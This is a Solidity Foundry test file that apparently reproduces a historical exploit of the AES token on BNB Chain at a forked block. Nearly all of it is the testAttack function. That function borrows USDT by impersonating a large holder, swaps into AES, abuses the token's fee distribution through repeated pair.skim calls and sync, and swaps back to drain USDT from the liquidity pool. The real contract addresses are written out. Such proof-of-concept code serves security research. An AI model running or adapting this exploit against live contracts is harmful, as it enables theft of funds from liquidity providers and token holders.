// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import '../src/AES.sol';

// https://bscscan.com/address/0xddc0cff76bcc0ee14c3e73af630c029fe020f907#code
contract AESTest is Test {
    IUniswapV2Pair pair;
    IUniswapV2Router02 router;
    AEST AESToken;
    ERC20 USDC;
    address Binance;

    function setUp() public {
        uint256 BLOCK_NUMBER = 26793740; // 23695904
        string memory TOKEN_RPC_URL = vm.envString('TOKEN_RPC_URL');

        vm.createSelectFork(
            TOKEN_RPC_URL,
            BLOCK_NUMBER
        );

        router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IUniswapV2Pair(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3);
        AESToken = AEST(payable(0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907));
        USDC = ERC20(0x55d398326f99059fF775485246999027B3197955);
        Binance = 0xEB2d2F1b8c558a40207669291Fda468E50c8A0bB;
    }

    function testVmFork() public {
        string memory TOKEN_RPC_URL = vm.envString('TOKEN_RPC_URL');
        uint256 forkId = vm.createFork(TOKEN_RPC_URL);
        vm.selectFork(forkId);
        console.log("current block number is ", block.number);
        vm.rollFork(26793740);
        console.log("after block number is ", block.number);
    }

    function testAttack() public {
        vm.prank(Binance);
        USDC.transfer(address(this), 1500_000 * 10**18);

        USDC.approve(address(router), ~uint256(0));
        AESToken.approve(address(router), ~uint256(0));

        console.log("Pair USDC balanceBefore is ", USDC.balanceOf(address(pair)) / 10**18);

        uint256 deadline = block.timestamp + 1000;
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(AESToken);

        AESToken.distributeFee();
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1500_000 * 10**18, 
            0, 
            path, 
            address(this), 
            deadline
        );

        uint256 AESTokenAmount = AESToken.balanceOf(address(this));
        uint256 pairTokenAmount = pair.balanceOf(address(pair));

        uint256 fee = AESToken.swapFeeTotal();

        if(AESTokenAmount / 9 * 100 >= pairTokenAmount * 99999 / 100000) {
            AESToken.transfer(address(pair), pairTokenAmount);
        }
        else {
            AESToken.transfer(address(pair), AESTokenAmount * 77632 / 100000);
            while(fee >= pairTokenAmount * 99999 / 100000) {
                pair.skim(address(pair));
                fee = AESToken.swapFeeTotal();
            }
        }

        pair.skim(address(this));
        AESToken.distributeFee();
        pair.sync();

        path[0] = address(AESToken);
        path[1] = address(USDC);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            AESToken.balanceOf(address(this)),
            0, 
            path, 
            address(this), 
            block.number + 1000
        );

        USDC.transfer(Binance, 1500_000 * 10**18);
        require(USDC.balanceOf(address(this)) > 0, "Attack failed");
        console.log("Pair USDC balanceAfter is ", USDC.balanceOf(address(pair)) / 10**18);
        console.log("My USDC balance is ", USDC.balanceOf(address(this)) / 10**18);
    }
}
